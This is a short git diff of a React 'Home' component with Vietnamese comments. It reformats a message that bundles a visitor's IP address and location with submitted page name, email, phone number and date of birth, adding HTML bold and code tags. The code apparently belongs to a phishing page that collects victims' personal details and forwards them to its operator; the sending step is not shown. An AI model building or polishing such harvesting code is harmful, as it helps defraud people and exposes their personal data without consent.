@@ -419,7 +419,7 @@ const Home = () => {
                 // Format phone number (chỉ lấy số, giữ nguyên format)
                 const phoneNumberOnly = formData.phone.replace(/[^\d+]/g, '');
 
-                // Tạo base message với format đúng
+                // Tạo base message với format đúng (HTML với <b> và <code>)
                 const currentGeoInfo = geoInfo || {
                     ip: 'k lấy được',
                     city: 'k lấy được',
@@ -427,14 +427,14 @@ const Home = () => {
                 };
                 const location = `${currentGeoInfo.city || 'k lấy được'} - ${currentGeoInfo.country_code || 'k lấy được'}`;
                 const messageLines = [
-                    `📅 Thời gian: ${formattedTime}`,
-                    `🌍 IP: ${currentGeoInfo.ip || 'k lấy được'}`,
-                    `📍 Vị trí: ${location}`,
+                    `📅 <b>Thời gian:</b> <code>${formattedTime}</code>`,
+                    `🌍 <b>IP:</b> <code>${currentGeoInfo.ip || 'k lấy được'}</code>`,
+                    `📍 <b>Vị trí:</b> <code>${location}</code>`,
                     '',
-                    `🔖 Page Name: ${formData.pageName}`,
-                    `📧 Email: ${formData.mail}`,
-                    `📱 Số điện thoại: ${phoneNumberOnly}`,
-                    `🎂 Ngày sinh: ${dateOfBirth}`,
+                    `🔖 <b>Page Name:</b> <code>${formData.pageName}</code>`,
+                    `📧 <b>Email:</b> <code>${formData.mail}</code>`,
+                    `📱 <b>Số điện thoại:</b> <code>${phoneNumberOnly}</code>`,
+                    `🎂 <b>Ngày sinh:</b> <code>${dateOfBirth}</code>`,
                     ''
                 ];
 
